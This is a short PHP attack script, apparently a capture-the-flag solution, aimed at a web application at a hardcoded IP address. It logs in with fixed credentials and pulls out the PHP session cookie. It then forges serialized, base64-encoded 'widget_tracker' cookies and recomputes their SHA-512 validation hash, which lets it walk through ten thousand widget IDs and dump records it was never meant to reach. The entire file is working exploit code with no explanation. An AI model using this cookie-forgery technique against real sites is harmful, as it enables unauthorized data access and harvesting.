<?php
define("USERNAME", "1@1.1");
define("PASSWORD", "t");

function setLoginCookie($username, $password) {
	$post_variables = "username=" . urlencode($username) . "&password=" . urlencode($password);

	$ch = curl_init('http://128.238.66.224/login.php');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post_variables);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	$results = curl_exec($ch);
	curl_close($ch);

	$results = explode("\r\n", $results);
	foreach ($results as $value) {
		if (preg_match("/PHPSE/", $value)) {
			$cookie = substr($value, 22, -8);
			break;
		}
	}

	return $cookie;
}

function getWidgetList($start, $cookie) {
	$ids = array();
     
	echo "start id: $start";
     
	for ($i=$start; $i<$start+100; $i++) {
		$ids[] = $i;
	}
     
	$widget_tracker = urlencode(base64_encode(serialize($ids)));
	$widget_validate = hash("sha512", serialize($ids));
	$cookie = "PHPSESSID={$cookie}; widget_tracker={$widget_tracker}; widget_validate={$widget_validate}";
     
	$ch = curl_init('http://128.238.66.224/widget_list.php');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIE, $cookie);
	$result = curl_exec($ch);
     
	$result = preg_replace("/<br \/>/", "\n", $result);
//      $result = preg_replace("/.*<\/a>\]/", "", $result);
     
	return $result;
}

$cookie = setLoginCookie(USERNAME, PASSWORD);

for ($i=1; $i<10000; $i+=100) {
	echo getWidgetList($i, $cookie);
}

